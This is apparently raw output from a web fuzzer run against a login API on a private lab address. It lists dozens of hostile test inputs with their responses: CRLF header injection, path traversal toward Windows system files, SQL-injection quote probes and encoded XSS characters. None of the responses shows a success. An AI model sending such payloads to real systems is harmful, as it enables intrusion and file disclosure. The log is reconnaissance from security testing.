Target: http://10.10.10.16/api/login
Total requests: 468
==============================================================================================================================================
ID    C.Time   Response   Lines      Word         Chars                  Server                                             Redirect   Payload    
==============================================================================================================================================
00131:  0.052s   C=00131:  C=200      0 L	       2 W	     21 Ch                                                                              "%0d%0aX-Injection-Header:%20AttackValue"
00125:  0.051s   C=00125:  C=200      0 L	       2 W	     21 Ch                                                                              "..\..\..\..\..\..\..\..\..\..\boot.ini"
00127:  0.051s   C=00127:  C=200      0 L	       2 W	     21 Ch                                                                              "/../../../../../../../../../../../boot.ini%00.jpg"
00129:  0.051s   C=00129:  C=200      0 L	       2 W	     21 Ch                                                                              "..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini"
00126:  0.051s   C=00126:  C=200      0 L	       2 W	     21 Ch                                                                              "/../../../../../../../../../../../boot.ini%00.html"
00128:  0.051s   C=00128:  C=200      0 L	       2 W	     21 Ch                                                                              "/.../.../.../.../.../"
00124:  0.051s   C=00124:  C=200      0 L	       2 W	     21 Ch                                                                              "..\..\..\..\..\..\..\..\..\..\boot.ini%00"
00122:  0.051s   C=00122:  C=200      0 L	       2 W	     21 Ch                                                                              "/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini"
00121:  0.048s   C=00121:  C=200      0 L	       2 W	     21 Ch                                                                              "/..\../..\../..\../..\../..\../..\../boot.ini"
00120:  0.049s   C=00120:  C=200      0 L	       2 W	     21 Ch                                                                              "/../../../../../../../../../../../boot.ini"
00117:  0.051s   C=00117:  C=200      0 L	       2 W	     21 Ch                                                                              "../../../../../../../../../../../../boot.ini"
00114:  0.051s   C=00114:  C=200      0 L	       2 W	     21 Ch                                                                              "../../../../../../../../../../../../localstart.asp%00"
00116:  0.051s   C=00116:  C=200      0 L	       2 W	     21 Ch                                                                              "../../../../../../../../../../../../boot.ini%00"
00118:  0.051s   C=00118:  C=200      0 L	       2 W	     21 Ch                                                                              "/./././././././././././boot.ini"
00113:  0.051s   C=00113:  C=200      0 L	       2 W	     21 Ch                                                                              "C:\boot.ini"
00119:  0.051s   C=00119:  C=200      0 L	       2 W	     21 Ch                                                                              "/../../../../../../../../../../../boot.ini%00"
00112:  0.049s   C=00112:  C=200      0 L	       2 W	     21 Ch                                                                              "C:/boot.ini"
00161:  0.049s   C=00161:  C=200      0 L	       2 W	     21 Ch                                                                              "^'"
00110:  0.050s   C=00110:  C=200      0 L	       2 W	     21 Ch                                                                              "C:/inetpub/wwwroot/global.asa"
00159:  0.049s   C=00159:  C=200      0 L	       2 W	     21 Ch                                                                              "--"
00165:  0.050s   C=00165:  C=200      0 L	       2 W	     21 Ch                                                                              "(')"
00198:  0.051s   C=00198:  C=200      0 L	       2 W	     21 Ch                                                                              "%20|"
00197:  0.051s   C=00197:  C=200      0 L	       2 W	     21 Ch                                                                              "%20"
00173:  0.051s   C=00173:  C=200      0 L	       2 W	     21 Ch                                                                              "\t"
00196:  0.051s   C=00196:  C=200      0 L	       2 W	     21 Ch                                                                              "%2C"
00189:  0.051s   C=00189:  C=200      0 L	       2 W	     21 Ch                                                                              "%60"
00194:  0.050s   C=00194:  C=200      0 L	       2 W	     21 Ch                                                                              "/%2A"
00195:  0.050s   C=00195:  C=200      0 L	       2 W	     21 Ch                                                                              "%2A"
00193:  0.049s   C=00193:  C=200      0 L	       2 W	     21 Ch                                                                              "%00"
00192:  0.048s   C=00192:  C=200      0 L	       2 W	     21 Ch                                                                              "%7C"
00191:  0.050s   C=00191:  C=200      0 L	       2 W	     21 Ch                                                                              "%5C/"
00188:  0.049s   C=00188:  C=200      0 L	       2 W	     21 Ch                                                                              "%3C%3F"
00190:  0.049s   C=00190:  C=200      0 L	       2 W	     21 Ch                                                                              "%5C"
00186:  0.049s   C=00186:  C=200      0 L	       2 W	     21 Ch                                                                              "<?"
00187:  0.049s   C=00187:  C=200      0 L	       2 W	     21 Ch                                                                              "%3C"
00185:  0.049s   C=00185:  C=200      0 L	       2 W	     21 Ch                                                                              "%00"
00184:  0.049s   C=00184:  C=200      0 L	       2 W	     21 Ch                                                                              "%00/"
00182:  0.051s   C=00182:  C=200      0 L	       2 W	     21 Ch                                                                              "#xA#xD"
00181:  0.051s   C=00181:  C=200      0 L	       2 W	     21 Ch                                                                              "#xD#xA"
00183:  0.052s   C=00183:  C=200      0 L	       2 W	     21 Ch                                                                              "/%00/"
00180:  0.049s   C=00180:  C=200      0 L	       2 W	     21 Ch                                                                              "#xA"
00179:  0.049s   C=00179:  C=200      0 L	       2 W	     21 Ch                                                                              "#xD"
00175:  0.051s   C=00175:  C=400      0 L	       2 W	     21 Ch                                                                              "&#10;"
00177:  0.051s   C=00177:  C=400      0 L	       2 W	     21 Ch                                                                              "&#10;&#13;"
00178:  0.051s   C=00178:  C=400      0 L	       2 W	     21 Ch                                                                              "&#13;&#10;"
00176:  0.051s   C=00176:  C=400      0 L	       2 W	     21 Ch                                                                              "&#13;"
00172:  0.050s   C=00172:  C=200      0 L	       2 W	     21 Ch                                                                              "%01%02%03%04%0a%0d%0aADSF"
00170:  0.049s   C=00170:  C=200      0 L	       2 W	     21 Ch                                                                              "!'"
00174:  0.049s   C=00174:  C=200      0 L	       2 W	     21 Ch                                                                              ""\t""
00171:  0.049s   C=00171:  C=400      0 L	       2 W	     21 Ch                                                                              "!@#$%%^#$%#$@#$%$$@#$%^^**(()"
00168:  0.051s   C=00168:  C=200      0 L	       2 W	     21 Ch                                                                              "*'"
00169:  0.051s   C=00169:  C=200      0 L	       2 W	     21 Ch                                                                              "#'"
00167:  0.049s   C=00167:  C=200      0 L	       2 W	     21 Ch                                                                              "[']"
00164:  0.050s   C=00164:  C=200      0 L	       2 W	     21 Ch                                                                              "@'"
00166:  0.051s   C=00166:  C=200      0 L	       2 W	     21 Ch                                                                              "{'}"
00163:  0.051s   C=00163:  C=200      0 L	       2 W	     21 Ch                                                                              "/'"
00160:  0.050s   C=00160:  C=200      0 L	       2 W	     21 Ch                                                                              "*|"
00162:  0.050s   C=00162:  C=200      0 L	       2 W	     21 Ch                                                                              "\'"
00199:  0.050s   C=00199:  C=200      0 L	       2 W	     21 Ch                                                                              "%250a"
00201:  0.050s   C=00201:  C=200      0 L	       2 W	     21 Ch                                                                              "../"
00205:  0.052s   C=00205:  C=400      0 L	       2 W	     21 Ch                                                                              "..%bg%qf"
00229:  0.051s   C=00229:  C=400      0 L	       2 W	     21 Ch                                                                              "&#x00003c"
00213:  0.051s   C=00213:  C=400      0 L	       2 W	     21 Ch                                                                              "&#60"
00236:  0.049s   C=00236:  C=400      0 L	       2 W	     21 Ch                                                                              "&#x000003c;"
00234:  0.050s   C=00234:  C=400      0 L	       2 W	     21 Ch                                                                              "&#x0003c;"
00235:  0.050s   C=00235:  C=400      0 L	       2 W	     21 Ch                                                                              "&#x00003c;"
00233:  0.052s   C=00233:  C=400      0 L	       2 W	     21 Ch                                                                              "&#x003c;"
00232:  0.050s   C=00232:  C=400      0 L	       2 W	     21 Ch                                                                              "&#x03c;"
00231:  0.050s   C=00231:  C=400      0 L	       2 W	     21 Ch                                                                              "&#x3c;"
00228:  0.050s   C=00228:  C=400      0 L	       2 W	     21 Ch                                                                              "&#x0003c"
00225:  0.050s   C=00225:  C=400      0 L	       2 W	     21 Ch                                                                              "&#x3c"
00226:  0.050s   C=00226:  C=400      0 L	       2 W	     21 Ch                                                                              "&#x03c"
00230:  0.050s   C=00230:  C=400      0 L	       2 W	     21 Ch                                                                              "&#x000003c"
00224:  0.049s   C=00224:  C=400      0 L	       2 W	     21 Ch                                                                              "&#0000060;"
00227:  0.050s   C=00227:  C=400      0 L	       2 W	     21 Ch                                                                              "&#x003c"
00223:  0.051s   C=00223:  C=400      0 L	       2 W	     21 Ch                                                                              "&#000060;"
00222:  0.049s   C=00222:  C=400      0 L	       2 W	     21 Ch                                                                              "&#00060;"
00221:  0.053s   C=00221:  C=400      0 L	       2 W	     21 Ch                                                                              "&#0060;"
00219:  0.053s   C=00219:  C=400      0 L	       2 W	     21 Ch                                                                              "&#60;"
00220:  0.054s   C=00220:  C=400      0 L	       2 W	     21 Ch                                                                              "&#060;"
00217:  0.049s   C=00217:  C=400      0 L	       2 W	     21 Ch                                                                              "&#000060"
00216:  0.049s   C=00216:  C=400      0 L	       2 W	     21 Ch                                                                              "&#00060"
00212:  0.049s   C=00212:  C=400      0 L	       2 W	     21 Ch                                                                              "..%u2216"
00218:  0.051s   C=00218:  C=400      0 L	       2 W	     21 Ch                                                                              "&#0000060"
00215:  0.051s   C=00215:  C=400      0 L	       2 W	     21 Ch                                                                              "&#0060"
00214:  0.050s   C=00214:  C=400      0 L	       2 W	     21 Ch                                                                              "&#060"
00211:  0.051s   C=00211:  C=200      0 L	       2 W	     21 Ch                                                                              "..%25%35%63"
00210:  0.049s   C=00210:  C=400      0 L	       2 W	     21 Ch                                                                              "..%%35%63"
00209:  0.049s   C=00209:  C=200      0 L	       2 W	     21 Ch                                                                              "..%255c"
00208:  0.050s   C=00208:  C=400      0 L	       2 W	     21 Ch                                                                              "..%%35c"
